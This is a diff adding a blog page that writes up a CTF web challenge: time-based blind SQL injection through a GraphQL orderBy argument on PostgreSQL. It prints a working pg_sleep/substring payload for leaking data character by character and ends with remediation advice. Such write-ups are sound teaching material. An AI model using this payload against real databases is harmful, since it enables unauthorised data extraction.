@@ -1,0 +1,96 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>HVCTF 2024 - Web: Green Injection</title>
+  <meta name="description" content="Blind SQLi on a GraphQL endpoint using time-based primitives plus a union-style exfiltration during HVCTF 2024." />
+  <link rel="stylesheet" href="../assets/css/main.css" />
+</head>
+<body>
+  <header class="site-header">
+    <div class="shell">
+      <nav class="navbar" aria-label="Primary">
+        <a class="brand" href="../index.html">vdnamliv</a>
+        <div class="nav-links">
+          <a href="../index.html">Home</a>
+          <a href="../about.html">About</a>
+          <a href="../contact.html">Contact</a>
+        </div>
+      </nav>
+    </div>
+  </header>
+
+  <main class="shell narrow">
+    <article class="article">
+      <header>
+        <p class="eyebrow">CTF &middot; Web</p>
+        <h1>HVCTF 2024 - Web: Green Injection</h1>
+        <p>Published <time datetime="2024-05-01">1 May 2024</time> &middot; HVCTF 2024</p>
+      </header>
+      <div class="article-body">
+        <p>Blind SQLi on a GraphQL endpoint using time-based primitives plus a union-style exfiltration. This entry highlights the payloads that mattered.</p>
+
+        <h2>Challenge overview</h2>
+        <ul>
+          <li>Score: 381</li>
+          <li>Solves: 12 / 210</li>
+          <li>Stack: GraphQL + PostgreSQL + custom WAF</li>
+        </ul>
+
+        <h2>Approach</h2>
+        <ol>
+          <li>Abuse the <code>orderBy</code> argument to inject arbitrary fragments.</li>
+          <li>Switch to time delays (<code>pg_sleep</code>) to dodge the WAF.</li>
+          <li>Combine with <code>substring</code> to brute force the flag.</li>
+        </ol>
+
+        <h2>Core payload</h2>
+        <pre><code class="language-graphql">query exploit($c:Int!) {
+  products(orderBy: "price, (select case when substring(flag,$c,1)='h' then pg_sleep(3) else 0 end)") {
+    id
+  }
+}
+</code></pre>
+
+        <h2>Automation</h2>
+        <table>
+          <thead>
+            <tr>
+              <th scope="col">Variable</th>
+              <th scope="col">Purpose</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>$c</code></td>
+              <td>Character index</td>
+            </tr>
+            <tr>
+              <td>alphabet</td>
+              <td><code>string.ascii_lowercase + "_{}"</code></td>
+            </tr>
+          </tbody>
+        </table>
+        <p>A short Python script times each request to recover the next character.</p>
+
+        <h2>Aftercare</h2>
+        <ul>
+          <li>Add a rule that rejects multiple commas in <code>orderBy</code>.</li>
+          <li>Swap to an allow list of safe column names.</li>
+        </ul>
+      </div>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <div class="shell">
+      <p>&copy; <span id="year">2025</span> vdnamliv</p>
+    </div>
+  </footer>
+  <script>
+    document.getElementById("year").textContent = new Date().getFullYear();
+  </script>
+</body>
+</html>
+
